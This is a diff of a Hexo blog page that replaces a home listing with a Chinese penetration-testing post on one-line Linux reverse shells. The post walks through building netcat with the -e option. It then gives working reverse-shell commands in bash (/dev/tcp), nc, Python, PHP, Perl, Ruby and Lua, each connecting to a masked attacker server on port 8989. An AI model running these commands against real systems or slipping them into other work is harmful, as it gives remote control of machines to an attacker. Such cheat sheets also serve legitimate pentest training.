@@ -108,20 +108,24 @@
 
 
 
-  <meta property="og:type" content="website">
+  <meta name="description" content="参考文献：https://www.anquanke.com/post/id/87017 ####实验环境：  阿里云服务器：120.xxx.xxx.xx（开启了8989端口）内网ubuntu：192.xxx.xx.xxx（无外网ip不可直接访问）  ####安装netcat默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹">
+<meta property="og:type" content="website">
 <meta property="og:title" content="cws6">
-<meta property="og:url" content="https://cws6.github.io/index.html">
+<meta property="og:url" content="https://cws6.github.io/user-5035860-1543717448/渗透测试/linux一句话反弹shell.html">
 <meta property="og:site_name" content="cws6">
+<meta property="og:description" content="参考文献：https://www.anquanke.com/post/id/87017 ####实验环境：  阿里云服务器：120.xxx.xxx.xx（开启了8989端口）内网ubuntu：192.xxx.xx.xxx（无外网ip不可直接访问）  ####安装netcat默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-12-02T02:24:08.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="cws6">
+<meta name="twitter:description" content="参考文献：https://www.anquanke.com/post/id/87017 ####实验环境：  阿里云服务器：120.xxx.xxx.xx（开启了8989端口）内网ubuntu：192.xxx.xx.xxx（无外网ip不可直接访问）  ####安装netcat默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹">
 
 
 
 
 
 
-  <link rel="canonical" href="https://cws6.github.io/">
+  <link rel="canonical" href="https://cws6.github.io/user-5035860-1543717448/渗透测试/linux一句话反弹shell.html">
 
 
 
@@ -131,7 +135,7 @@
   };
 </script>
 
-  <title>cws6</title>
+  <title> | cws6</title>
   
 
 
@@ -180,8 +184,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
     <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
 
@@ -223,7 +226,7 @@
         
         
           
-          <li class="menu-item menu-item-home menu-item-active">
+          <li class="menu-item menu-item-home">
 
     
     
@@ -279,6 +282,22 @@
   
     
 
+    
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+    
+
+  
+
+
   
 
   
@@ -302,487 +321,134 @@
           
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2018/12/02/p神代码审计知识星球二周年wp-1/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="cws6">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="cws6">
-    </span>
-
     
+    
+    <div class="post-block page">
       <header class="post-header">
 
+<h1 class="post-title" itemprop="name headline"></h1>
+
+<div class="post-meta">
+  
+  
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
         
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/12/02/p神代码审计知识星球二周年wp-1/" class="post-title-link" itemprop="https://cws6.github.io/index.html">p神代码审计知识星球二周年wp[1]</a>
-              
-            
-          </h1>
+      
+    
+      
+      
         
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-12-02 18:07:50 / Modified: 18:33:05" itemprop="dateCreated datePublished" datetime="2018-12-02T18:07:50+08:00">2018-12-02</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
+          <li>渗透测试</li>
+        
+      
     
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/linux一句话反弹shell.html/">LINUX一句话反弹SHELL.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+
+</div>
+
+</header>
 
       
       
-
       
+      <div class="post-body">
         
-          
-          题目：https://code-breaking.com参考文献：https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlhttps://blog.csdn.net/while0/a
-          ...
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2018/12/02/p神代码审计知识星球二周年wp-1/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
         
+          <p>参考文献：<a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></p>
+<p>####实验环境：</p>
+<blockquote>
+<p>阿里云服务器：120.xxx.xxx.xx（开启了8989端口）<br>内网ubuntu：192.xxx.xx.xxx（无外网ip不可直接访问）</p>
+</blockquote>
+<p>####安装netcat<br>默认的各个linux发行版本已经自带了<code>netcat工具包</code>，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能<code>参数 -e</code>这里都被阉割了，所以需要手动下载二进制安装包。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">下载安装包：</span><br><span class="line">#wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certifica</span><br><span class="line">解压：</span><br><span class="line">#tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">编译安装：</span><br><span class="line">/netcat-0.7.1# ./configure</span><br><span class="line">/netcat-0.7.1# make</span><br><span class="line">/netcat-0.7.1# make install</span><br><span class="line">/netcat-0.7.1# make clean</span><br></pre></td></tr></table></figure></p>
+<p>####1.使用bash命令反弹<br><strong>1.1先在服务器上监听8989端口</strong><br><code>nc -l -p 8989</code><br><strong>1.2在目标机器上执行以下命令</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/120.xxx.xxx.xx/8989 0&gt;&amp;1</span><br><span class="line">bash -i：产生一个bash交互环境</span><br><span class="line">&gt;&amp;：将联合符号前面的内容与后面相结合然后一起重定向给后者</span><br><span class="line">/dev/tcp/120.xxx.xxx.xx/8989：让攻击方与目标主机建立tcp链接</span><br><span class="line">0&gt;&amp;1：将`标准的输入`与`标准输出`内容相结合，然后重定向给前面`标准输出`内容</span><br></pre></td></tr></table></figure></p>
+<p>####2.使用nc反弹<br><strong>2.1先在服务器上监听8989端口</strong><br><code>nc -l -p 8989</code><br><strong>2.2在目标机器上执行以下命令</strong><br><code>nc -e /bin/sh 120.xxx.xxx.xx 8989</code></p>
+<p>####3.一句话反弹shell<br><strong>3.1python</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;120.xxx.xxx.xxx&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure></p>
+<p><strong>3.2php</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;120.xxx.xxx.xxx&quot;,8989);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure></p>
+<p><strong>3.3perl</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;120.xxx.xxx.xxx&quot;;$p=8989;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure></p>
+<p><strong>3.4ruby</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;120.xxx.xxx.xxx&quot;,8989).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure></p>
+<p><strong>3.5lua</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;120.xxx.xxx.xxx&apos;,&apos;8989&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br></pre></td></tr></table></figure></p>
+
+        
+      </div>
+      
+      
       
     </div>
-
     
 
-    
-    
-    
-    <div>
-    
-    </div>
 
+  
+  
+  <ul class="breadcrumb">
     
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
       
       
-        <div class="post-eof"></div>
+        
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
+        
       
-    </footer>
+    
+      
+      
+        
+          <li>渗透测试</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/linux一句话反弹shell.html/">LINUX一句话反弹SHELL.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+    
+    
+    
   </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2018/12/02/empire入门/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="cws6">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="cws6">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/12/02/empire入门/" class="post-title-link" itemprop="https://cws6.github.io/index.html">empire入门</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-12-02 10:27:03 / Modified: 19:17:06" itemprop="dateCreated datePublished" datetime="2018-12-02T10:27:03+08:00">2018-12-02</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          参考文献：http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4158.htmlhttp://www.freebuf.com/articles/network/175097.htmlhttps://www.tuicool.com/arti
-          ...
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2018/12/02/empire入门/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-    <div>
-    
-    </div>
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2018/12/01/源码泄露总结/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="cws6">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="cws6">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/12/01/源码泄露总结/" class="post-title-link" itemprop="https://cws6.github.io/index.html">源码泄露总结</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-12-01 21:26:29" itemprop="dateCreated datePublished" datetime="2018-12-01T21:26:29+08:00">2018-12-01</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2018-12-02 18:33:02" itemprop="dateModified" datetime="2018-12-02T18:33:02+08:00">2018-12-02</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          参考文献：https://www.jianshu.com/p/15b63d14781fGitHack地址https://blog.csdn.net/gitchat/article/details/79014538
-GIT 源码泄露GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建
-          ...
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2018/12/01/源码泄露总结/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-    <div>
-    
-    </div>
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
 
 
           </div>
           
+
+  
+
+
 
         </div>
         
@@ -1008,6 +674,10 @@ GIT 源码泄露GitHack是一个.git泄露利用测试脚本，通过泄露的�
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
+
+
 
   
 
